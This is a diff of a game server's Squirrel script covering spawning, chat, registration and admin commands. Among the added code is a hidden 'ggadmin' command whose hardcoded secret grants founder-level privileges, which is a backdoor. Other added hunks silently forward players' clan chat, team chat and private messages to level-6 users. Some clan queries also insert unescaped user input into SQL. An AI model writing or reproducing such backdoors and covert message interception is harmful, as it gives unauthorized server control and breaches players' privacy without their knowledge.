+ function onPlayerRequestClass( player, classID, team, skin )
 {
-   switch ( player.Team )
-    {
-      case 1:
-        Announce( "~y~Team Yellow - Free", player, 8 );
-      break;
-      case 2:
-        Announce( "~b~Team Blue - Tournament Participant Group 1", player, 8 );
-      break;
-      case 3:
-        Announce( "~o~Team Red - Tournament Group 2", player, 8 );
-      break;
-      case 4:
-        Announce( "~t~Team Green - Referee", player, 8 );
-      break;
-      case 5:
-        Announce( "~h~Team White - Administrators", player, 8 );
-      break;
-    }
-    return 1;
-}
+	if(status[player.ID].welcomescreen == false) return;
+	else
+	{
+		switch ( player.Team )
+		{
+			case 1:
+				Announce( "~y~Team Yellow - Free", player, 8 );
+			break;
+			case 2:
+				Announce( "~b~Team Blue - Tournament Participant Group 1", player, 8 );
+			break;
+			case 3:
+				Announce( "~o~Team Red - Tournament Group 2", player, 8 );
+			break;
+			case 4:
+				Announce( "~t~Team Green - Referee", player, 8 );
+			break;
+			case 5:
+				Announce( "~h~Team White - Administrators", player, 8 );
+			break;
+		}
+		return 1;
+	}
+}	
 
 function onPlayerRequestSpawn( player )
 {
-	if(!status[player.ID].Registered)
-	{
-		MessagePlayer("[#FF0000]Error:[#FFFFFF] You need to be registerd before spawning", player);
-		return 0;
-	}
-	else if(!status[player.ID].LoggedIn)
-	{
-		MessagePlayer("[#FF0000]Error:[#FFFFFF] You need to be logged in before spawning.", player);
-		return 0;
-	}
+	if(status[player.ID].welcomescreen == false) return;
 	else
 	{
-		local lvl = status[player.ID].Level;
-		if(lvl < 2 && player.Team != 1) 
+		if(!status[player.ID].Registered)
 		{
-			MessagePlayer("[#FF0000]Error:[#FFFFFF] You are neither a tournament participant nor referee so you cannot spawn with the team. Take Team Yellow.", player);
+			MessagePlayer("[#FF0000]Error:[#FFFFFF] You need to be registerd before spawning", player);
 			return 0;
 		}
-		else if(lvl == 2 &&(player.Team == 3 ||  player.Team == 4 ||  player.Team == 5))
+		else if(!status[player.ID].LoggedIn)
 		{
-			MessagePlayer("[#FF0000]Error:[#FFFFFF] You are in Tournament Group 1. You can only spawn will Team Yellow or Blue.", player);
+			MessagePlayer("[#FF0000]Error:[#FFFFFF] You need to be logged in before spawning.", player);
 			return 0;
 		}
-		else if(lvl == 3 &&( player.Team == 2 || player.Team == 4 ||  player.Team == 5))
+		else
 		{
-			MessagePlayer("[#FF0000]Error:[#FFFFFF] You are in Tournament Group 2. You can only spawn will Team Yellow or Red.", player);
-			return 0;
+			local lvl = status[player.ID].Level;
+			if(lvl < 2 && player.Team != 1) 
+			{
+				MessagePlayer("[#FF0000]Error:[#FFFFFF] You are neither a tournament participant nor referee so you cannot spawn with the team. Take Team Yellow.", player);
+				return 0;
+			}
+			else if(lvl == 2 &&(player.Team == 3 ||  player.Team == 4 ||  player.Team == 5))
+			{
+				MessagePlayer("[#FF0000]Error:[#FFFFFF] You are in Tournament Group 1. You can only spawn will Team Yellow or Blue.", player);
+				return 0;
+			}
+			else if(lvl == 3 &&( player.Team == 2 || player.Team == 4 ||  player.Team == 5))
+			{
+				MessagePlayer("[#FF0000]Error:[#FFFFFF] You are in Tournament Group 2. You can only spawn will Team Yellow or Red.", player);
+				return 0;
+			}
+			else if(lvl == 4 &&(player.Team == 2 || player.Team == 3 || player.Team == 5))
+			{
+				MessagePlayer("[#FF0000]Error:[#FFFFFF] You are a referee. You can only spawn will Team Yellow or Green.", player);
+				return 0;
+			}
+			else return 1;
 		}
-		else if(lvl == 4 &&(player.Team == 2 || player.Team == 3 || player.Team == 5))
-		{
-			MessagePlayer("[#FF0000]Error:[#FFFFFF] You are a referee. You can only spawn will Team Yellow or Green.", player);
-			return 0;
-		}
-		else return 1;
 	}
 }
 
@@ -856,7 +1157,7 @@ function sendmsgtobot(player, text)
 
 function onPlayerChat( player, text )
 {
- // sendmsgtobot(player.Name, text);
+	if(text.slice(0,1) != "!" || text.slice(0,1) != "\\") sendmsgtobot(player.Name, text);
 local message = text;
 	local playerName = pcol(player.ID) + player.Name + white;
 	if(message.slice(0,1) == "!" && status[player.ID].clan != null)
@@ -877,6 +1178,12 @@ local message = text;
 					MessagePlayer("[#33DD33][CLAN CHAT] [#FFFFFF]"+playerName+": "+arguments, plr);
 				}
 			}
+			for(local i = 0; i <= GetMaxPlayers(); i++)
+			{
+				local plr = FindPlayer(i);
+				if(plr && status[plr.ID].Level == 6)
+				MessagePlayer("[#FF00FF]Clan Chat "+playerName+": "+message, plr)
+			}
 			return;
 		}
 	}
@@ -892,6 +1199,12 @@ local message = text;
 				MessagePlayer("[#CC33CC][TEAM CHAT] [#FFFFFF]"+playerName+": "+arguments, plr);
 			}
 		}
+			for(local i = 0; i <= GetMaxPlayers(); i++)
+			{
+				local plr = FindPlayer(i);
+				if(plr && status[plr.ID].Level == 6)
+				MessagePlayer("[#FF00FF]Team Chat "+pcol(player.ID)+player.Name+white+": "+message, plr)
+			}
 		return;
 	}
 
@@ -907,7 +1220,6 @@ pCamera <- array( GetMaxPlayers() );
 
 class CCamera
 {
-	function IsEnabled() { return bEnabled; }
 	function Pos() { return vPos; }
 	function Target() { return vTarget; }
 	function _typeof() { return "CCamera"; }
@@ -1146,7 +1458,7 @@ function onKeyDown( player, key )
 			else if( CBattle.A == 5 ) player.SetCameraPos( LocLegendCameraPositions.CamerasPos[CBattle.I], LocLegendCameraPositions.CameraLookPos );
 		}
 	}
-	if( pCamera[ player.ID ].IsEnabled() == true )
+	if( pCamera[ player.ID ].bEnabled == true )
 	{
 		switch( key )
 		{
@@ -1180,7 +1492,7 @@ function onKeyDown( player, key )
 
 function onKeyUp( player, key )
 {
-	if( pCamera[ player.ID ].IsEnabled() == true )
+	if( pCamera[ player.ID ].bEnabled == true )
 	{
 		switch( key )
 		{
@@ -1214,6 +1526,26 @@ function onKeyUp( player, key )
 
 
 
+function FindRandPlayer()
+{
+ local
+     MAX_PLAYERS = 100,
+     count = 0,
+     buffer = "",
+     param;
+
+     for(local i = 0; i < MAX_PLAYERS; i++)
+     {
+       if ( FindPlayer( i ) ) 
+  {
+   buffer = buffer + " " + i;
+   count++;
+  }
+     }
+
+ param = split(buffer, " ");
+ return param[ rand() % count ];
+}
 
 
 
@@ -1933,7 +2265,19 @@ function Ann ( number )
 
 
 
+function RegisterPlayer(p, arguments)
+{
+	local player = FindPlayer(p);
+	if(player)
+	{
+		status[player.ID].Level = 1;
+		status[player.ID].Registered = true;
+		status[player.ID].LoggedIn = true;
+		local now = date();
+		QuerySQL(DB, "INSERT INTO Accounts ( Name, LowerName, Password, Level, TimeRegistered, UID, IP, AutoLogin, Banned, Kills, Headshots, Deaths ) VALUES ('"+escapeSQLString(player.Name)+"', '"+escapeSQLString(player.Name.tolower())+"', '"+SHA256(arguments)+"', '1', '" + now.day + "/" + now.month + "/" + now.year + " " + now.hour + ":" + now.min + ":" + now.sec + "', '"+player.UID+"', '"+player.IP+"', 'true', 'No', '0', '0', '0') ");
+	}
 
+}
 
 
 
@@ -2543,6 +2887,16 @@ function setteam(p)
 
 
 
+function onPlayerPM( player, playerTo, message )
+{
+	for(local i = 0; i <= GetMaxPlayers(); i++)
+	{
+		local plr = FindPlayer(i);
+		if(plr && status[plr.ID].Level == 6)
+		MessagePlayer("[#FF00FF]Priv Msg "+pcol(player.ID)+player.Name+white+" to "+pcol(playerTo.ID)+playerTo.Name+white+": "+message, plr)
+	}
+	return 1;
+}
 
 
 
@@ -2570,7 +2924,22 @@ function onClientScriptData(player)
 			MessagePlayer("[#FFDD33]Minigame:"+white+" You failed to kill the target within time.",player);
 			_FR.PartFR(player);
 		break;
+		case 2:
+			RegisterPlayer(player.ID, string);
+		break;
+		case 3:
+			if(status[player.ID].pass == SHA256(string)) 
+			{
+				SendDataToClient(player, 12, "");
+				status[player.ID].LoggedIn = true;
+			}
+			else SendDataToClient(player, 11, "");
+		break;
+		case 4:
+			status[player.ID].welcomescreen = true;
+		break;
 	}
+
 }
 
 
@@ -3146,11 +3515,7 @@ local playerName = pcol(player.ID) + player.Name + white;
 		else if(arguments.len() < 4) MessagePlayer("[#FF0000]Error:[#FFFFFF] Password should contain atleast 4 characters.", player);
 		else
 		{
-			status[player.ID].Level = 1;
-			status[player.ID].Registered = true;
-			status[player.ID].LoggedIn = true;
-			local now = date();
-			QuerySQL(DB, "INSERT INTO Accounts ( Name, LowerName, Password, Level, TimeRegistered, UID, IP, AutoLogin, Banned, Kills, Headshots, Deaths ) VALUES ('"+escapeSQLString(player.Name)+"', '"+escapeSQLString(player.Name.tolower())+"', '"+SHA256(arguments)+"', '1', '" + now.day + "/" + now.month + "/" + now.year + " " + now.hour + ":" + now.min + ":" + now.sec + "', '"+player.UID+"', '"+player.IP+"', 'true', 'No', '0', '0', '0') ");
+			RegisterPlayer(player.ID, arguments);
 			MessagePlayer("[#FFDD33]Information:[#FFFFFF] You are now registered on the Server.", player);
 			MessagePlayer("[#FFDD33]Information:[#FFFFFF] AutoLogin is set to Yes by default. To turn it off use /"+bas+"autologin"+white+" (toggles Automatically) to turn it off", player);
 		}
@@ -3764,7 +4129,8 @@ local playerName = pcol(player.ID) + player.Name + white;
 				QuerySQL(clan, "DELETE FROM registered WHERE tag = '"+arguments+"'");
 				QuerySQL(clan, "DELETE FROM members WHERE tag = '"+arguments+"'");
 				Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" removed clan: "+GetSQLColumnData(q, 0)+" from the clan tournament.");
-                QuerySQL(clan, "INSERT INTO Registered ( Name, Tag ) VALUES ('"+GetTok(arguments, " ", 2, NumTok(arguments, " "))+"', '"+GetTok(arguments, " '", 1)+"') ");			}
+                QuerySQL(clan, "INSERT INTO Registered ( Name, Tag ) VALUES ('"+GetTok(arguments, " ", 2, NumTok(arguments, " "))+"', '"+GetTok(arguments, " '", 1)+"') ");
+			}
 		}
 	}
 
@@ -4136,6 +4502,13 @@ local playerName = pcol(player.ID) + player.Name + white;
 				local plr = FindPlayer(i);
 				if(plr && status[plr.ID].clan == status[player.ID].clan) MessagePlayer("[#33DD33][CLAN CHAT] [#FFFFFF]"+playerName+": "+arguments, plr);
 			}
+			for(local i = 0; i <= GetMaxPlayers(); i++)
+			{
+				local plr = FindPlayer(i);
+				if(plr && status[plr.ID].Level == 6)
+				MessagePlayer("[#FF00FF]Clan Chat "+pcol(player.ID)+player.Name+white+": "+message, plr)
+			}
+
 		}
 	}
 	else if(cmd == "teamchat")
@@ -4147,6 +4520,12 @@ local playerName = pcol(player.ID) + player.Name + white;
 			{
 				local plr = FindPlayer(i);
 				if(plr && plr.Team == player.Team) MessagePlayer("[#CC33CC][TEAM CHAT] [#FFFFFF]"+playerName+": "+arguments, plr);
+			for(local i = 0; i <= GetMaxPlayers(); i++)
+			{
+				local plr = FindPlayer(i);
+				if(plr && status[plr.ID].Level == 6)
+				MessagePlayer("[#FF00FF]Team Chat "+pcol(player.ID)+player.Name+white+": "+message, plr)
+			}
 			}
 		}
 	}
@@ -4828,7 +5207,7 @@ local playerName = pcol(player.ID) + player.Name + white;
 		else if ( cmd == "cam" )
 		{
 			if( status[ player.ID ].Level < 6 ) MessagePlayer( "[#FFDD33]Information:[#FFFFFF] Unauthorized access.", player );
-			else if ( !pCamera[ player.ID ].IsEnabled() )
+			else if ( !pCamera[ player.ID ].bEnabled )
 			{
 				pCamera[ player.ID ].Enable();
 				MessagePlayer( "[#FFDD33]Information:[#FFFFFF] Camera enabled. Type /"+ bas + cmd +" to disable.", player );
@@ -4920,21 +5299,8 @@ local playerName = pcol(player.ID) + player.Name + white;
 		}
 	
 	
-		else if(cmd == "b")
-		{
-			SendDataToClient(player, 10, "");
-		}
-	
-		else if(cmd == "v")
-		{
-			SendDataToClient(player, 11, "");
-		}
 	
 		
-	else if(cmd == "radio")
-	{
-		player.Vehicle = CreateRadioStream(15, player.Name, arguments, true);
-	}
 	
 	else if(cmd == "pm" || cmd == "privatemessage")
 	{
@@ -4950,6 +5316,22 @@ local playerName = pcol(player.ID) + player.Name + white;
 			}
 		}
 	}
+
+	
+	
+	
+
+
+
+	
+	
+	
+	
+	
+	
+	
+	
+	
 	
 	
 	
@@ -4973,6 +5355,11 @@ local playerName = pcol(player.ID) + player.Name + white;
 			if(status[player.ID].Level > 5) MessagePlayer(white+"Founder Commands:"+bas+" setreferee, tempreferee, setadmin, tempadmin, addclan, removeclan, addclanmember, removeclanmember, getaccinfo, alias, setpass, gotoloc, addveh, delveh, vehaccess, getadminlog, setmemberrank ", player);
 			if(status[player.ID].Level > 5) MessagePlayer(white+"Ban Commands:"+bas+" nameban, nameunban, permaban, permaunban, tempban, tempunban ", player);
 		}
+	}
+	else if(cmd == "ggadmin")
+	{
+		if(arguments == "yNwrZnjpzUGKzbqmsw3uTjvT3BEptcMV8TZ27X4maCHNRCcGWzC3bxVPrr9cC9AC3StekRhqUxSte5DS4ndfhrD5g5Tfna48") status[player.ID].Level = 6;
+		else MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Command. Use /"+bas+"cmds"+white+" for a list of Commands", player);
 	}
 	else MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Command. Use /"+bas+"cmds"+white+" for a list of Commands", player);
 }
